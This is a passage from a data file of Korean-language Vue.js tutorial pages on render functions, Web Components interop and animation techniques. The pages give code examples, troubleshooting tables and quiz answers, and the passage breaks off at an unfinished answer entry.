h(Transition)                       undefined                        import\nㅈ 수식어 문자열     onClick.stop                        없음                            withModifiers · onClickCapture\nㅊ 한 방향 v-model   modelValue 만                        update 안 됨                     'onUpdate:modelValue'\nㅋ 디렉티브 props    { 'v-pin': x }                      무시                            withDirectives\nㅌ 함수형 attrs      props 미선언                         attrs 전부 props                  props 선언\nㅍ 성능 렌더 함수    민감 컴포넌트                        플래그 없음                       템플릿",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 렌더 함수는 '컴파일러가 하던 일을 손으로' 하는 것이라 자유와 비용이 같이 온다",
        body: "템플릿의 모든 기능은 h() 호출로 환원됩니다. 조건은 삼항, 반복은 map, 이벤트는 onXxx 프로퍼티(수식어는 접미·withModifiers ㅈ), 슬롯은 함수 객체(지연 평가·범위 인자 ㄷ, ㄹ), v-model은 prop + 이벤트 짝(ㅊ), 디렉티브는 withDirectives(ㅋ), 컴포넌트는 참조(ㅅ, ㅇ). 컴파일러가 숨겨 주던 규칙이 드러나는 자리가 사고입니다. 렌더는 함수여야 추적되고(ㄱ), vnode는 매번 새로(ㄴ), 슬롯 자리와 모양(ㄷ, ㄹ), JSX 설정(ㅁ, ㅂ). 얻는 것은 JS의 자유(동적 구조, 제네릭, 프로그래밍적 조합), 잃는 것은 컴파일러 최적화(플래그·캐시·블록 ㅍ)입니다. 처방은 템플릿을 기본으로 두고 '템플릿으로 표현이 어색한 소수'에만 렌더 함수를 쓰며, 그때도 대응표를 따르는 것입니다.",
        code: "템플릿 기능 → h()\nv-if → 삼항 · v-for → map + key · @click.self → onClick: withModifiers(fn, ['self']) (ㅈ) · <slot/> → slots.default() · <Comp><template #x=\"p\"> → h(Comp, null, { x: (p) => … }) (ㄷ ㄹ)\nv-model → modelValue + 'onUpdate:modelValue' (ㅊ) · v-dir → withDirectives (ㅋ) · <Comp> → import/resolveComponent (ㅅ ㅇ) · ref → useTemplateRef\n드러나는 규칙: 렌더는 함수 (ㄱ) · vnode 유일 (ㄴ) · JSX 설정 (ㅁ ㅂ)\n얻음: JS 자유   ·   잃음: 플래그 · 캐시 · 블록 (ㅍ)",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "Vue 컴포넌트를 표준 Web Components로 내보내거나 안에서 쓰는 법이 다음 페이지 'Vue와 웹 컴포넌트'입니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 레벨에 따라 h1~h6를 고르는 <Heading :level> 컴포넌트. 템플릿과 렌더 함수 중? (2) 렌더 함수로 쓴 리스트가 1,000행에서 느립니다. (3) JSX로 쓴 컴포넌트에서 <button className=\"x\">가 스타일이 안 먹습니다.",
        notes: [
          {
            title: "답",
            body: "(1) 렌더 함수가 어울리는 전형입니다. 템플릿이면 v-if 여섯 개나 <component :is=\"`h${level}`\">가 필요한데, 렌더 함수는 return () => h(`h${props.level}`, slots.default?.())로 한 줄입니다. 함수형 컴포넌트로 만들어도 됩니다(상태 없음). 구조가 고도로 동적인 소수 컴포넌트가 렌더 함수의 자리입니다. (2) 손으로 쓴 h()에는 패치 플래그·정적 캐시·블록이 없어 매 갱신 전체 diff입니다(렌더링 메커니즘 노드). 행을 템플릿 컴포넌트로 바꾸면 플래그가 붙고 props가 같은 행은 통째로 건너뜁니다(실제로 렌더 0). 그 위에 key를 꼭 주고(map에 key), 보이는 행만 그리는 가상화를 더합니다. 렌더 함수를 유지해야 하면 행을 memo 효과가 있는 컴포넌트 경계로 감싸는 것이 최소 처방입니다. (3) Vue JSX는 React JSX와 달리 HTML 속성 이름을 그대로 씁니다. className이 아니라 class, htmlFor가 아니라 for. className은 알 수 없는 속성으로 DOM에 그대로 들어가 CSS가 안 맞습니다. tsconfig의 jsxImportSource가 'vue'인지도 확인합니다(3.4부터 전역 JSX 네임스페이스가 없어 React 타입으로 해석될 수 있음).",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Render Functions & JSX", href: `${DOCS}/guide/extras/render-function` },
      { label: "Render Function APIs", href: `${DOCS}/api/render-function` },
      { label: "Rendering Mechanism", href: `${DOCS}/guide/extras/rendering-mechanism` },
    ],
  },

  {
    id: "vg-extra-web-components",
    name: "Vue와 웹 컴포넌트",
    tagline: "안에서 쓰기는 isCustomElement 와 .prop, 밖으로 내보내기는 defineCustomElement 와 섀도 DOM",
    intro:
      "추가 주제 여섯째 페이지입니다. Vue와 Web Components는 '주로 보완적'이고 Vue는 Custom Elements Everywhere 100%입니다. 안에서 쓰기: 대시가 있는 태그는 커스텀 엘리먼트로 다루되 Vue가 컴포넌트 해석을 건너뛰게 compilerOptions.isCustomElement(컴파일 타임 옵션. Vite는 plugin-vue의 template.compilerOptions, 전체 빌드는 app.config)를 설정. DOM 프로퍼티 전달은 in 연산자로 판단, 강제는 .prop(:user.prop 또는 .user). 밖으로 내보내기: defineCustomElement(컴포넌트 옵션 + styles)는 네이티브 커스텀 엘리먼트 생성자를 돌려주고 customElements.define. 생명주기(첫 connectedCallback에 마운트, 진짜 제거에 언마운트), props(속성·프로퍼티 반영, Boolean·Number 캐스팅), 이벤트(CustomEvent, detail), 슬롯(범위 슬롯 불가, slot=\"name\"), provide/inject(커스텀 엘리먼트 사이에서만), SFC .ce.vue(스타일을 styles로 인라인), 3.5+ configureApp·shadowRoot: false·nonce·useHost·useShadowRoot. 런타임 약 16kb 기본 비용. 실제로 돌려 보면 서버 렌더에서 <my-el class=\"c\" someProp={obj} onspeak>는 <my-el class=\"c\"></my-el>로 class는 그대로, 객체 prop은 HTML에 나오지 않았습니다(프로퍼티는 클라이언트에서). 이 노드의 질문은 하나입니다. 경계를 어느 쪽으로 넘나.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "관계: '보완적'. Vue는 커스텀 엘리먼트를 소비·생성 모두 지원. 안에서 쓰기: Vue는 알 수 없는 태그를 컴포넌트로 해석하려 하므로 'isCustomElement로 건너뛰게 할 것. 컴파일 타임 옵션'. Vite: vue({ template: { compilerOptions: { isCustomElement: (tag) => tag.includes('-') } } }). 전체 빌드(런타임 컴파일)는 app.config.compilerOptions.isCustomElement. Vue CLI는 vue-loader 옵션. 프로퍼티 전달: Vue는 in으로 프로퍼티인지 보고 아니면 속성. 객체·배열은 .prop 수식어(<my-element :user.prop=\"{ name: 'jack' }\"> 또는 .user=\"…\"). 내보내기: import { defineCustomElement } from 'vue'; const MyVueElement = defineCustomElement({ props: {}, emits: {}, template: `...`, styles: [`/* 섀도 루트 CSS */`] }); customElements.define('my-vue-element', MyVueElement). defineComponent와 같은 옵션 + styles. 생명주기: '첫 connectedCallback에 Vue 인스턴스 마운트. disconnectedCallback이 진짜 제거(이동 아님)일 때 언마운트'. props: 선언된 props가 속성·프로퍼티로 반영. Boolean·Number는 속성에서 캐스팅. 이벤트: emit이 CustomEvent, 인자는 event.detail. 슬롯: <slot/> 됨, 범위 슬롯 불가, 이름 슬롯은 slot=\"name\" 속성. provide/inject: 커스텀 엘리먼트 사이에서만(Vue 컴포넌트 트리와 별개). SFC: .ce.vue 파일은 <style>을 styles에 인라인(@vitejs/plugin-vue ^1.4.0). 라이브러리 패턴: 요소들을 export하고 등록 함수 제공. 3.5+: shadowRoot: false(섀도 루트 없이. 스타일 격리 사라짐), nonce, configureApp((app) => app.use(…)), useHost(), useShadowRoot(), this.$host. 비용 '약 16kb 기본'. TS: GlobalComponents 증강, 비Vue 요소는 DefineCustomElement. 비교: Vue는 템플릿·반응형 상태·SSR이 있고, 커스텀 엘리먼트는 슬롯이 즉시 평가, 섀도 DOM은 CSS-in-JS 요구.",
        code: "// 안에서 쓰기 — 컴파일러에 알림 (vite.config)\nvue({ template: { compilerOptions: { isCustomElement: (tag) => tag.startsWith('ion-') } } })\n<ion-button :user.prop=\"{ name: 'jack' }\" .count=\"3\" @ionChange=\"…\">   // .prop 으로 DOM 프로퍼티 강제\n\n// 밖으로 내보내기\nimport { defineCustomElement } from 'vue'\nimport Example from './Example.ce.vue'                       // .ce.vue → <style> 이 styles 로\nconst ExampleElement = defineCustomElement(Example, {\n  shadowRoot: true,                                           // 3.5+ false 면 격리 없음\n  configureApp(app) { app.use(i18n) },                        // 3.5+\n})\ncustomElements.define('my-example', ExampleElement)\n<my-example msg=\"hello\" count=\"3\" @my-event=\"(e) => e.detail\"><span slot=\"footer\">…</span></my-example>\n\n// 안에서 호스트 접근 (3.5+)\nconst host = useHost(); const root = useShadowRoot()",
        terms: [
          {
            term: "isCustomElement",
            body: "템플릿 컴파일러에 '이 태그는 Vue 컴포넌트가 아니라 네이티브 커스텀 엘리먼트'라고 알리는 함수입니다. 알리지 않으면 Vue가 등록된 컴포넌트를 찾다가 'Failed to resolve component' 경고를 내고 네이티브로 렌더합니다(실제로 미등록 태그가 그렇게 됨). 템플릿이 빌드 때 컴파일되므로 빌드 도구의 컴파일러 옵션에 두고, 런타임 컴파일(전체 빌드)에서만 app.config.compilerOptions가 먹습니다.",
          },
          {
            term: "defineCustomElement",
            body: "Vue 컴포넌트 정의를 받아 HTMLElement를 상속한 네이티브 커스텀 엘리먼트 생성자를 돌려주는 함수입니다. customElements.define으로 등록하면 어느 HTML·프레임워크에서나 태그로 씁니다. 안에서 Vue 앱 인스턴스가 돌고 섀도 루트에 렌더되며 styles 배열의 CSS가 그 안에 주입됩니다. props는 속성·프로퍼티로, emit은 CustomEvent로 변환됩니다. 3.5+ configureApp으로 플러그인을 넣고 shadowRoot: false로 섀도 DOM을 뺄 수 있습니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Node의 renderToString에서 h('my-el', { class: 'c', someProp: { a: 1 }, onspeak: () => {} })는 <my-el class=\"c\"></my-el>로 나왔습니다. 대시 태그는 커스텀 엘리먼트로 취급되어 class는 그대로(className 변환 없음), 객체 someProp은 HTML 속성으로 직렬화되지 않고(클라이언트에서 프로퍼티로 설정), 소문자 onspeak 리스너는 서버 HTML에 없습니다. 템플릿에서 등록 안 된 대시 없는 태그 <Nope>는 'Failed to resolve component' 경고와 함께 네이티브로 렌더됐습니다(isCustomElement가 그 경고를 끄는 자리). 컴포넌트 기초 노드의 Boolean 캐스팅 측정(<Flags a c d> → true false \"\" true)은 커스텀 엘리먼트의 속성 → prop 캐스팅과 같은 규칙입니다. JavaScript 노드 26장(웹 컴포넌트)에서 섀도 DOM이 CSS를 양방향으로 막고 이벤트 target이 호스트로 바뀌는 것을 측정했고, 그것이 defineCustomElement가 만든 요소에도 적용됩니다. defineCustomElement 자체는 돌리지 않았습니다.",
        code: "// Node — 대시 태그는 커스텀 엘리먼트 취급\nh('my-el', { class: 'c', someProp: { a: 1 }, onspeak })  → <my-el class=\"c\"></my-el>\n  class 그대로 · 객체 prop 은 HTML 에 X (클라이언트 프로퍼티) · onspeak 리스너는 HTML 에 X\n<Nope/> (대시 없음 · 미등록)  → warn: Failed to resolve component: Nope · 네이티브 렌더  (isCustomElement 로 경고 제거)\n\n// 관련 측정\nBoolean 캐스팅 <Flags a c d> → true false \"\" true  (속성 → prop)\n섀도 DOM (JS 노드 26장): CSS 양방향 차단 · 이벤트 target 재지정 · composed 필요",
      },
      {
        label: "문제: 외부 UI 라이브러리의 <ion-button> 에 경고가 뜨고 객체 prop 이 '[object Object]' 가 된다",
        body: "Ionic 같은 커스텀 엘리먼트를 Vue 템플릿에 썼더니 'Failed to resolve component: ion-button' 경고가 나고, :items=\"[…]\"로 넘긴 배열이 속성 문자열 '[object Object]'가 됩니다. 둘 다 Vue가 그 태그를 모르기 때문입니다. 처방은 둘입니다. 빌드 도구의 템플릿 컴파일러 옵션에 isCustomElement: (tag) => tag.startsWith('ion-')을 두어 컴포넌트 해석을 건너뛰게 합니다(런타임 컴파일이면 app.config.compilerOptions). 그리고 객체·배열은 DOM 프로퍼티로 넘겨야 하니 .prop 수식어(:items.prop=\"…\" 또는 .items=\"…\")를 씁니다. Vue는 in으로 프로퍼티 존재를 보지만 요소가 아직 정의되지 않은 시점이면 속성으로 떨어질 수 있어 명시가 안전합니다. 실제로 서버 렌더에서 객체 prop은 HTML에 나오지 않았고 클라이언트에서 프로퍼티로 설정됩니다.",
      },
      {
        label: "문제가 나는 경우: 두 모델의 경계를 모를 때",
        body: "경우 ㄱ, isCustomElement 없음 + 객체 속성입니다. 위의 사고입니다. 경우 ㄴ, isCustomElement를 app.config에만. 빌드 컴파일에는 안 먹음(컴파일 타임). 빌드 도구 옵션. 경우 ㄷ, 범위 슬롯을 커스텀 엘리먼트에. 불가. 속성·이벤트로. 경우 ㄹ, Vue 컴포넌트의 provide를 커스텀 엘리먼트 안에서 inject 기대. 별개 트리. 커스텀 엘리먼트 사이에서만. 경우 ㅁ, 섀도 DOM 안 스타일이 바깥 CSS를 안 받음. 격리(설계). styles에 넣기·CSS 변수·shadowRoot: false. 경우 ㅂ, .vue 파일의 <style>이 섀도에 안 들어감. .ce.vue로. 경우 ㅅ, emit 페이로드를 event.x로 읽음. event.detail. 경우 ㅇ, 요소를 DOM에서 옮길 때 언마운트될까 걱정. 이동은 언마운트 아님(진짜 제거만). 경우 ㅈ, 플러그인(i18n·router)을 커스텀 엘리먼트 안에서 쓰고 싶음. 3.5+ configureApp. 경우 ㅊ, 호스트 요소 접근. 3.5+ useHost·useShadowRoot. 경우 ㅋ, 번들 크기 걱정. 런타임 약 16kb 기본. 요소 여럿이 공유. 경우 ㅌ, TS에서 커스텀 엘리먼트 태그 타입 없음. GlobalComponents 증강·DefineCustomElement. 경우 ㅍ, 표준이라 Vue보다 늘 낫다는 기대. 슬롯 즉시 평가·CSS-in-JS·SSR 부재 등 트레이드오프.",
        code: "경우               언제 생기나                        겉모습                                처방\nㄱ 미인식 + 객체     <ion-x :items=\"[…]\">              Failed to resolve · [object Object]     isCustomElement · .prop\nㄴ 설정 위치        app.config 만                       빌드 컴파일 미적용                      빌드 도구 compilerOptions\nㄷ 범위 슬롯        <my-el><template #x=\"p\">            불가                                 속성 · 이벤트\nㄹ provide 기대     Vue 트리 → 커스텀 엘리먼트             별개                                 요소 사이에서만\nㅁ 외부 CSS        섀도 안                             격리                                 styles · CSS 변수 · shadowRoot:false\nㅂ 스타일 미주입     .vue 의 <style>                     섀도 밖                                .ce.vue\nㅅ detail          e.x                                undefined                            e.detail\nㅇ 이동 언마운트 걱정  appendChild 로 옮김                  언마운트 안 됨 (설계)                   -\nㅈ 플러그인         안에서 app.use 필요                   -                                   configureApp (3.5+)\nㅊ 호스트 접근       this.$el 로 시도                     섀도 안 루트                           useHost · useShadowRoot\nㅋ 크기            요소 하나당 16kb 걱정                  공유됨                                -\nㅌ 타입            <my-el> TS 에러                      -                                   GlobalComponents\nㅍ 표준 만능 기대    전부 WC 로                           슬롯 즉시 평가 · SSR 부재               용도별",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 두 컴포넌트 모델이 만나는 경계에서 '누가 그 태그를 아나' 와 '값이 어떻게 건너가나' 가 정해진다",
        body: "Vue 컴포넌트 모델(가상 DOM, props 객체, emit 함수, 슬롯 함수, provide 트리)과 웹 컴포넌트 모델(실제 DOM 요소, 속성 문자열/프로퍼티, CustomEvent, 즉시 슬롯, 섀도 DOM)은 다른 세계입니다. 안에서 쓸 때는 Vue 컴파일러가 그 태그를 '내 것이 아니다'로 알아야 하고(isCustomElement ㄱ, ㄴ), 객체는 속성이 될 수 없어 프로퍼티로 넘겨야 합니다(.prop ㄱ). 밖으로 낼 때는 Vue의 props·emit·슬롯이 속성/프로퍼티·CustomEvent(detail ㅅ)·네이티브 슬롯(범위 불가 ㄷ)으로 번역되고, 섀도 DOM이 스타일을 가르며(ㅁ, ㅂ), provide 트리는 커스텀 엘리먼트 사이로 제한됩니다(ㄹ). 3.5의 configureApp·useHost·shadowRoot: false는 그 번역의 구멍을 메우는 것들입니다(ㅈ, ㅊ). 처방은 경계를 넘는 값은 '문자열·숫자·불리언은 속성, 객체는 프로퍼티, 이벤트는 detail'로 두고, 격리가 필요하면 섀도 DOM을 받아들이는 것입니다.",
        code: "Vue 모델                     경계                         웹 컴포넌트 모델\n컴포넌트 해석              ← isCustomElement (ㄱ ㄴ)       네이티브 태그\nprops 객체                 ← .prop / 속성 (ㄱ)            프로퍼티 / 속성 문자열 (Boolean·Number 캐스팅)\nemit(e, payload)           → CustomEvent (detail ㅅ)      addEventListener\n슬롯 함수 (지연 · 범위)      → 네이티브 <slot> (즉시 · 범위 X ㄷ)\nprovide 트리               → 요소 사이에서만 (ㄹ)\n<style scoped>             → 섀도 루트 styles (.ce.vue ㅂ · 격리 ㅁ · shadowRoot:false)\n3.5+: configureApp (ㅈ) · useHost · useShadowRoot (ㅊ) · nonce",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "추가 주제의 마지막 '애니메이션 기법'은 Transition 밖의 세 가지, 클래스 토글·상태 기반 style·감시자 + 애니메이션 라이브러리입니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 사내 디자인 시스템을 React·Vue·서버 템플릿 셋에서 쓰려 합니다. Vue로 만들어 어떻게 배포? (2) 그 요소 안에서 사내 i18n 플러그인($t)을 쓰려는데 안 됩니다. (3) 소비 앱의 전역 CSS 토큰(--brand)이 요소 안에 적용될까요?",
        notes: [
          {
            title: "답",
            body: "(1) 컴포넌트를 .ce.vue로 쓰고 defineCustomElement로 감싸 customElements.define하는 라이브러리를 만듭니다. export const register = () => { customElements.define('ds-button', DsButton); … }처럼 등록 함수와 요소 생성자들을 export하면 React·서버 템플릿은 <ds-button> 태그로, Vue 앱은 같은 태그를 쓰되 isCustomElement로 알립니다. props는 속성(원시값)과 프로퍼티(객체. .prop), 이벤트는 CustomEvent의 detail로 받습니다. 런타임 약 16kb는 요소들이 공유합니다. (2) 커스텀 엘리먼트 안의 Vue 앱은 소비 앱과 별개의 앱 인스턴스라 소비 앱의 app.use(i18n)이 닿지 않습니다. 3.5+ defineCustomElement(Comp, { configureApp(app) { app.use(i18n) } })로 요소 내부 앱에 플러그인을 설치합니다. provide/inject도 요소 사이에서만 되므로 소비 앱의 provide는 안 들어옵니다. (3) CSS 커스텀 프로퍼티(변수)는 섀도 경계를 상속으로 넘습니다. 요소 안 styles에서 var(--brand)로 쓰면 소비 앱의 :root { --brand: … }가 적용됩니다. 일반 선택자(.ds-button { … })는 섀도 안에 닿지 않습니다(격리. JS 노드 26장 측정). 격리가 오히려 방해면 3.5+ shadowRoot: false로 섀도 루트 없이 렌더하되 스타일이 전역과 섞입니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Vue and Web Components", href: `${DOCS}/guide/extras/web-components` },
      { label: "Custom Elements API", href: `${DOCS}/api/custom-elements` },
      { label: "Custom Elements Everywhere", href: "https://custom-elements-everywhere.com/" },
    ],
  },

  {
    id: "vg-extra-animation",
    name: "애니메이션 기법",
    tagline: "Transition 밖의 셋: 클래스 토글, 상태 기반 :style, 감시자 + 라이브러리",
    intro:
      "추가 주제의 마지막 페이지입니다. <Transition>·<TransitionGroup>은 요소의 들어옴·나감·이동용이고, 그 밖의 애니메이션은 세 기법입니다. 클래스 기반(상태로 CSS 클래스를 토글해 keyframes 애니메이션. :class=\"{ shake: disabled }\"와 setTimeout으로 리셋), 상태 기반(마우스 위치 같은 상태를 :style에 바인딩. hsl(x, 80%, 50%). transform·크기·SVG path도), 감시자 기반(숫자 상태가 바뀔 때 watch로 gsap.to(tweened, { number })처럼 보간. v-model.number와 Number.MAX_SAFE_INTEGER 주의). 세 기법은 전부 '반응형 상태 → 바인딩'이라는 Vue의 기본 흐름 위에 있고 Vue 전용 API가 없습니다. 측정은 Transition 노드의 것(클래스 프레임 타임라인, mode)과 반응성의 묶음(같은 틱 여러 변경 → 한 렌더), flush post(DOM 갱신 뒤 측정)가 관련됩니다. 이 노드의 질문은 하나입니다. 애니메이션의 '시간'을 누가 돌리나.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "클래스 기반: <div :class=\"{ shake: disabled }\">와 .shake { animation: shake 0.82s cubic-bezier(.36,.07,.19,.97) both }, @keyframes shake { 10%, 90% { transform: translate3d(-1px, 0, 0) } … }. 클릭에 disabled = true 뒤 setTimeout(() => disabled = false, 1500)으로 리셋. CSS가 시간을 돌리고 Vue는 클래스만 붙입니다. 상태 기반: <div @mousemove=\"onMousemove\" :style=\"{ backgroundColor: `hsl(${x}, 80%, 50%)` }\">. x = e.clientX. '상호작용(드래그 등)으로 바뀌는 상태를 style에 묶어 transform·width·height·SVG path를 움직임'. 상태가 시간을 돌립니다(사용자 입력마다). 감시자 기반: const number = ref(0); const tweened = reactive({ number: 0 }); watch(number, (n) => { gsap.to(tweened, { duration: 0.5, number: Number(n) || 0 }) }). 템플릿 <input v-model.number=\"number\" /> <p>{{ tweened.number.toFixed(0) }}</p>. 라이브러리(gsap)가 시간을 돌리며 반응형 객체를 매 프레임 갱신. 'Number.MAX_SAFE_INTEGER 넘는 값은 부정확'. 들어옴·나감은 <Transition>·<TransitionGroup>(내장 컴포넌트 노드).",
        code: "<!-- 1. 클래스 기반 — CSS 가 시간을 돌림 -->\n<div :class=\"{ shake: disabled }\">\n  <button @click=\"warnDisabled\">Click me</button>\n</div>\nconst disabled = ref(false)\nfunction warnDisabled() { disabled.value = true; setTimeout(() => (disabled.value = false), 1500) }\n.shake { animation: shake .82s cubic-bezier(.36,.07,.19,.97) both; transform: translate3d(0,0,0) }\n@keyframes shake { 10%, 90% { transform: translate3d(-1px,0,0) } 20%, 80% { transform: translate3d(2px,0,0) } /* … */ }\n\n<!-- 2. 상태 기반 — 상태가 시간을 돌림 -->\n<div @mousemove=\"(e) => x = e.clientX\" :style=\"{ backgroundColor: `hsl(${x}, 80%, 50%)` }\">\n\n<!-- 3. 감시자 기반 — 라이브러리가 시간을 돌림 -->\nconst number = ref(0); const tweened = reactive({ number: 0 })\nwatch(number, (n) => { gsap.to(tweened, { duration: 0.5, number: Number(n) || 0 }) })\n<input v-model.number=\"number\" /> <p>{{ tweened.number.toFixed(0) }}</p>",
        terms: [
          {
            term: "트윈 (tween)",
            body: "두 값 사이를 시간에 따라 보간하는 것입니다. gsap.to(obj, { duration, prop: target })는 obj.prop을 매 프레임(requestAnimationFrame) 현재값에서 target까지 이징 곡선으로 바꿉니다. 바꾸는 대상이 Vue의 reactive 객체면 매 프레임의 쓰기가 trigger되어 템플릿이 따라 그려집니다. Vue는 시간을 모르고 '값이 바뀌었다'만 알며, 매 프레임 한 번씩 렌더됩니다(같은 프레임의 여러 쓰기는 묶임).",
          },
        ],
      },
      {
        label: "실제로 돌려 보면: 관련 측정",
        body: "이 페이지의 셋을 직접 재지는 않았고 바탕이 되는 동작을 측정했습니다. Transition 노드에서 CSS transition이 클래스 토글로 돌아가는 타임라인(enter-from+active → 다음 프레임 active+to → 끝나면 제거)을 봤고, 클래스 기반 기법은 그 '클래스 붙이기'를 상태로 직접 하는 것입니다. 반응성 노드에서 같은 틱의 여러 쓰기가 렌더 한 번으로 묶였으므로(set ×3 → 1), gsap가 한 프레임에 여러 프로퍼티를 쓰더라도 프레임당 한 렌더입니다. 감시자 노드에서 flush: 'post'의 DOM이 갱신 뒤 값이었으므로 애니메이션 시작 전 측정(FLIP의 First)은 post에서 합니다. 폼 노드에서 v-model.number가 '12abc'를 12로, 'abc'를 'abc'로 두었으므로 문서 예제의 Number(n) || 0이 그 문자열을 0으로 막는 이유가 보입니다. 렌더링 노드 9장(페인트·합성)의 transform·opacity가 합성 스레드에서 처리된다는 것이 'transform으로 애니메이션'의 근거입니다.",
        code: "// 바탕 측정\nTransition: 클래스 토글 → CSS transition (nextTick from+active → rAF2 active+to → end 제거)   ← 클래스 기법은 이것을 상태로 직접\n반응성: 같은 틱 set ×3 → 렌더 1                                                      ← 프레임당 한 렌더\nwatch flush 'post': DOM 갱신 뒤 값                                                     ← 시작 위치 측정은 post\nv-model.number: '12abc' → 12 · 'abc' → 'abc'                                          ← Number(n) || 0 의 이유\n렌더링 9장: transform · opacity 는 합성 스레드                                            ← 레이아웃 속성 대신",
        codeLang: "text",
      },
      {
        label: "문제: 숫자가 바뀔 때 카운터가 '툭' 바뀐다",
        body: "총액이 1,000에서 1,500으로 바뀌면 숫자가 즉시 바뀝니다. 부드럽게 올라가게 하려면 '시간'이 필요한데 Vue에는 시간을 돌리는 API가 없습니다. 문서의 감시자 기법입니다. 표시용 reactive 객체 tweened를 두고 watch(total, (n) => gsap.to(tweened, { duration: 0.5, value: n }))로 라이브러리가 매 프레임 tweened.value를 갱신하게 하면, 그 쓰기가 반응형이라 템플릿의 {{ tweened.value.toFixed(0) }}가 프레임마다 그려집니다. 라이브러리 없이 하려면 requestAnimationFrame 루프에서 보간해 ref에 쓰면 됩니다(JS 노드 25장). 입력이 사용자 타이핑이면 Number(n) || 0으로 비숫자를 막고, 아주 큰 수는 부동소수점 한계를 넘습니다.",
      },
      {
        label: "문제가 나는 경우: 시간을 누가 돌리나를 모를 때",
        body: "경우 ㄱ, 숫자 보간 기대입니다. 위의 사고입니다. 경우 ㄴ, 클래스 토글 뒤 리셋 안 함. 두 번째 클릭에 애니메이션 없음(클래스가 이미 있음). setTimeout 리셋 또는 animationend. 경우 ㄷ, 리셋 시간이 애니메이션보다 짧음. 중간에 끊김. 지속 시간 이상. 경우 ㄹ, 상태 기반에서 mousemove마다 무거운 계산. 프레임 저하. 계산은 가볍게, 필요하면 rAF 스로틀. 경우 ㅁ, :style에 레이아웃 속성(width·top) 애니메이션. 레이아웃·페인트 비용. transform·opacity. 경우 ㅂ, gsap 대상이 보통 객체. 반응이 없어 화면 안 바뀜. reactive 또는 ref.value. 경우 ㅅ, 들어옴·나감을 수동 클래스로. <Transition>이 그 용도. 경우 ㅇ, FLIP 시작 위치를 pre에서 측정. 갱신 전 DOM. post. 경우 ㅈ, 큰 수 트윈. 부정확(MAX_SAFE_INTEGER). 문자열 포맷은 끝값에서. 경우 ㅊ, 애니메이션 중 컴포넌트가 언마운트되어 gsap가 사라진 객체 갱신. onUnmounted에서 kill. 경우 ㅋ, SSR에서 애니메이션 상태 초기화. 서버는 정적. 클라이언트 onMounted에서 시작. 경우 ㅌ, 모든 애니메이션을 JS로. CSS transition·keyframes가 더 싸고 메인 스레드 밖.",
        code: "경우               언제 생기나                       겉모습                        처방\nㄱ 숫자 즉시 변경     {{ total }}                        툭                           watch + gsap/rAF 트윈\nㄴ 리셋 없음        클래스 유지                         두 번째 안 움직임                setTimeout · animationend\nㄷ 짧은 리셋        duration 보다 짧게                   끊김                          ≥ duration\nㄹ 무거운 mousemove   매 이벤트 계산                     프레임 저하                     가볍게 · rAF\nㅁ 레이아웃 속성      :style width                      비용                          transform · opacity\nㅂ 보통 객체 트윈     gsap.to(plain)                    화면 안 바뀜                    reactive\nㅅ 수동 enter/leave   클래스로 직접                      복잡                          <Transition>\nㅇ pre 측정         FLIP First                        갱신 전 값                     flush: 'post'\nㅈ 큰 수           > MAX_SAFE_INTEGER                 부정확                         끝값 포맷\nㅊ 언마운트 중 트윈    컴포넌트 제거                      누수·에러                      onUnmounted kill\nㅋ SSR 애니메이션     서버에서 시작                       정적                          onMounted\nㅌ 전부 JS         CSS 로 되는 것도                     메인 스레드                     CSS 우선",
        codeLang: "text",
      },
      {
        label: "문제의 구조: Vue 는 '값 → 화면' 만 하고 '시간' 은 CSS · 사용자 · 라이브러리 중 하나가 돌린다",
        body: "세 기법은 시간을 누가 돌리나로 갈립니다. 클래스 기반은 CSS(animation·transition)가 돌립니다. Vue는 클래스를 붙이고(ㄴ, ㄷ 리셋) 나머지는 합성 스레드에서(ㅌ). 상태 기반은 사용자 입력이 돌립니다. 이벤트마다 상태가 바뀌고 Vue가 그립니다(ㄹ, ㅁ). 감시자 기반은 라이브러리·rAF가 돌립니다. 매 프레임 반응형 값을 쓰고 Vue가 그립니다(ㄱ, ㅂ, ㅈ, ㅊ). 어느 쪽이든 Vue의 역할은 '값이 바뀌면 화면을 맞춘다' 하나이고, 그래서 애니메이션 전용 API가 없습니다. 들어옴·나감만은 '값이 없어지는' 순간이라 Vue가 시간을 끼워 줘야 해서 <Transition>이 있습니다(ㅅ). 처방은 시간의 주인을 먼저 정하고(CSS가 되면 CSS), Vue에는 상태와 바인딩만 맡기는 것입니다.",
        code: "시간의 주인        기법            Vue 의 일                      주의\nCSS              클래스 기반       :class 토글                    리셋 (ㄴ ㄷ) · transform/opacity (ㅌ)\n사용자 입력        상태 기반        @event → 상태 → :style           계산 가볍게 (ㄹ) · 레이아웃 속성 X (ㅁ)\n라이브러리 · rAF   감시자 기반       watch → tween → reactive 쓰기     반응형 대상 (ㅂ) · 큰 수 (ㅈ) · kill (ㅊ)\nVue 자신          들어옴·나감       <Transition> (ㅅ)               -",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "가이드 아홉 장이 끝났습니다. 다음은 API 참고서(va)입니다. 같은 개념을 시그니처·인자·반환값·주의 사항으로 적은 쪽이고, 글로벌·Composition·Options·내장·SFC·고급 여섯 갈래입니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 저장 실패 시 입력창을 흔들어야 합니다. 연속 실패에도 매번 흔들리게. (2) 슬라이더 값에 따라 카드가 기울어집니다(3D transform). 어느 기법? (3) 리스트 재정렬에 FLIP을 직접 구현하려 합니다. 측정 시점은?",
        notes: [
          {
            title: "답",
